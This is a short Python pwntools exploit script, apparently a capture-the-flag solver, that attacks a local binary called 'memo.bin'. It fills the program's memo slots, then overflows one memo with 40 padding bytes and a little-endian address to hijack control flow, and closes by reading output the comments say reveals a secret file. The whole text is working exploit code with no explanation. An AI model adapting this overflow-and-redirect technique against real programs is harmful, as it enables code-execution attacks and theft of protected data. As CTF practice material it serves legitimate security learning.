#!/usr/bin/python3

from pwn import *
import os


def exploit():
    # Write your exploit logic here.
    p = process("./memo.bin")

    # Exploit BOF.
    for i in range(10):
        for j in range(5):
            print(p.recvline())
        print(p.recvuntil(b"(Enter W/R/M/E): "))
        p.sendline(b"W")
        print(p.recvuntil(b": "))
        p.sendline(b"AAAAAAAA")

    for _ in range(5):
        print(p.recvline())
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"M")
    print(p.recvuntil(b"Input the ID of memo to modify: "))
    p.sendline(b"9")
    print(p.recvuntil(b": "))
    p.sendline(b"B" * 40 + b"\x26\x09\x40")

    for _ in range(5):
        print(p.recvline())
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"E")

    # Reveal the secret file.
    print(p.recvline())


if __name__ == "__main__":
    exploit()
